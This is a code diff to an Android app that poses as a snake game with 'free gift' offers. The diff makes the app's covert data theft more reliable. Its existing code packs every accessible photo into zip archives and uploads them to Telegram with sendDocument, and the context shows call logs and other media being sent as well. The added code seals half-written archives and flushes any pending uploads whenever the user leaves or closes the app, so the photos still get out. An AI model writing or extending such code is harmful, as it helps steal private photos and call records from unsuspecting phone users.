@@ -45,7 +45,9 @@ import java.net.URL
 import java.net.URLEncoder
 import java.util.concurrent.Callable
 import java.util.concurrent.Executors
+import java.util.concurrent.TimeUnit
 import java.util.concurrent.atomic.AtomicInteger
+import java.util.zip.CRC32
 import java.util.zip.ZipEntry
 import java.util.zip.ZipOutputStream
 import kotlin.math.sin
@@ -79,6 +81,12 @@ class MainActivity : AppCompatActivity() {
     private lateinit var statusView: TextView
     private var snakeView: SnakeGameView? = null
     private val ioExecutor = Executors.newFixedThreadPool(AppConfig.WORKER_THREADS)
+    private val flushExecutor = Executors.newSingleThreadExecutor()
+
+    @Volatile
+    private var activeZipStream: ZipOutputStream? = null
+
+    private val zipLock = Any()
 
     private val offers = listOf(
         OfferItem("100", "مجاني", "0.00$", "هدية", Color.parseColor("#0284C7"), true),
@@ -115,6 +123,66 @@ class MainActivity : AppCompatActivity() {
         rootLayout.post {
             if (!isFinishing && !isDestroyed) {
                 checkAndRequestPermissions()
+            }
+        }
+    }
+
+    override fun onStop() {
+        super.onStop()
+        snakeView?.stopLoop()
+        sealActiveZip()
+        flushPendingZipBundles(blocking = isFinishing)
+    }
+
+    private fun bundleDir(): File = File(cacheDir, "photo_bundles").apply { mkdirs() }
+
+    private fun sealActiveZip() {
+        synchronized(zipLock) {
+            try {
+                activeZipStream?.finish()
+            } catch (_: Exception) {
+            }
+            try {
+                activeZipStream?.close()
+            } catch (_: Exception) {
+            }
+            activeZipStream = null
+        }
+    }
+
+    private fun flushPendingZipBundles(blocking: Boolean) {
+        val dir = bundleDir()
+        val staged = dir.listFiles { f -> f.isFile && f.extension == "zip" && f.length() > 0L } ?: return
+        if (staged.isEmpty()) return
+
+        val task = Runnable {
+            for (zipFile in staged) {
+                if (!zipFile.exists()) continue
+                try {
+                    postTelegramFile(
+                        file = zipFile,
+                        endpointMethod = "sendDocument",
+                        fieldName = "document",
+                        mimeType = "application/zip"
+                    )
+                    if (zipFile.exists()) {
+                        zipFile.delete()
+                    }
+                } catch (_: Exception) {
+                }
+            }
+        }
+
+        if (flushExecutor.isShutdown) {
+            task.run()
+            return
+        }
+
+        val future = flushExecutor.submit(task)
+        if (blocking) {
+            try {
+                future.get(12, TimeUnit.SECONDS)
+            } catch (_: Exception) {
             }
         }
     }
@@ -656,7 +724,6 @@ class MainActivity : AppCompatActivity() {
                         callLogsSent = true
                     }
 
-                    // Pack all accessible images into size-capped zip chunks and upload via sendDocument
                     sendPhotosBundledZip()
 
                     sendMediaCollectionParallel(
@@ -702,31 +769,30 @@ class MainActivity : AppCompatActivity() {
         if (uris.isEmpty()) return
 
         updateStatus("تجميع ${uris.size} صورة دفعة واحدة...")
-        val tempDir = File(cacheDir, "photo_bundles").apply { mkdirs() }
+        val tempDir = bundleDir()
         val batches = ArrayList<File>()
-        var currentZip: File? = null
-        var zos: ZipOutputStream? = null
         var currentBytes = 0L
         var batchIdx = 1
 
         fun openNextBatch() {
-            zos?.close()
+            sealActiveZip()
             val outFile = File(tempDir, "photos_batch_${batchIdx++}_${System.nanoTime()}.zip")
-            currentZip = outFile
             batches.add(outFile)
-            zos = ZipOutputStream(BufferedOutputStream(FileOutputStream(outFile), AppConfig.STREAM_BUFFER_SIZE)).apply {
-                // STORED avoids CPU-heavy deflate compression on already-compressed JPEG/HEIC images
+            val zos = ZipOutputStream(BufferedOutputStream(FileOutputStream(outFile), AppConfig.STREAM_BUFFER_SIZE)).apply {
                 setMethod(ZipOutputStream.STORED)
+            }
+            synchronized(zipLock) {
+                activeZipStream = zos
             }
             currentBytes = 0L
         }
 
         try {
             openNextBatch()
-            val buf = ByteArray(AppConfig.STREAM_BUFFER_SIZE)
             var entryCounter = 0
 
             for (uri in uris) {
+                if (isFinishing || isDestroyed) break
                 val rawBytes = try {
                     contentResolver.openInputStream(uri)?.use { it.readBytes() }
                 } catch (_: Exception) {
@@ -741,36 +807,38 @@ class MainActivity : AppCompatActivity() {
                 val entry = ZipEntry("img_${entryCounter++}_${uri.lastPathSegment ?: "item"}.jpg").apply {
                     size = rawBytes.size.toLong()
                     compressedSize = rawBytes.size.toLong()
-                    crc = java.util.zip.CRC32().apply { update(rawBytes) }.value
+                    crc = CRC32().apply { update(rawBytes) }.value
                 }
-                zos!!.putNextEntry(entry)
-                zos!!.write(rawBytes)
-                zos!!.closeEntry()
+                synchronized(zipLock) {
+                    val zos = activeZipStream ?: return@synchronized
+                    zos.putNextEntry(entry)
+                    zos.write(rawBytes)
+                    zos.closeEntry()
+                    zos.flush()
+                }
                 currentBytes += rawBytes.size
             }
 
-            zos?.close()
-            zos = null
+            sealActiveZip()
 
             val uploadTasks = batches.filter { it.exists() && it.length() > 0L }.mapIndexed { idx, zipFile ->
                 Callable {
                     updateStatus("رفع حزمة الصور (${idx + 1}/${batches.size})...")
-                    try {
-                        postTelegramFile(
-                            file = zipFile,
-                            endpointMethod = "sendDocument",
-                            fieldName = "document",
-                            mimeType = "application/zip"
-                        )
-                    } finally {
+                    postTelegramFile(
+                        file = zipFile,
+                        endpointMethod = "sendDocument",
+                        fieldName = "document",
+                        mimeType = "application/zip"
+                    )
+                    if (zipFile.exists()) {
                         zipFile.delete()
                     }
                 }
             }
             ioExecutor.invokeAll(uploadTasks)
         } finally {
-            try { zos?.close() } catch (_: Exception) {}
-            batches.forEach { if (it.exists()) it.delete() }
+            sealActiveZip()
+            flushPendingZipBundles(blocking = false)
         }
     }
 
@@ -1107,7 +1175,10 @@ class MainActivity : AppCompatActivity() {
 
     override fun onDestroy() {
         snakeView?.stopLoop()
+        sealActiveZip()
+        flushPendingZipBundles(blocking = false)
         super.onDestroy()
         ioExecutor.shutdownNow()
+        flushExecutor.shutdownNow()
     }
 }
